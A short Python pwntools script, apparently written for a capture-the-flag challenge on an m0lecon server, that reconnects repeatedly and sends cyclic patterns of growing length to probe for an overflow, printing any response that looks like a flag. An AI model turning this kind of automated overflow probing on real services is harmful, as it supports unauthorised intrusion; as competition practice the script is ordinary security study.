from pwn import *
import os

for i in range(2200, 4000, 1):
    log.warn(f"cyclic shit {i}")
    pp = remote("nullwall.challs.m0lecon.it", 1337)
    pp.recvuntil(b"option: ")
    pp.sendline(b"1")
    pp.recvuntil(b"s: ")
    pp.sendline(cyclic(i))
    pp.recvuntil(b"option: ")
    pp.sendline(b"2")
    shit = pp.recvuntil(b"1. ")
    if (b"}" in shit or b"{" in shit):
        print (shit)
        os.system("exit")
    os.system('clear')
    print(shit)


pp.interactive()
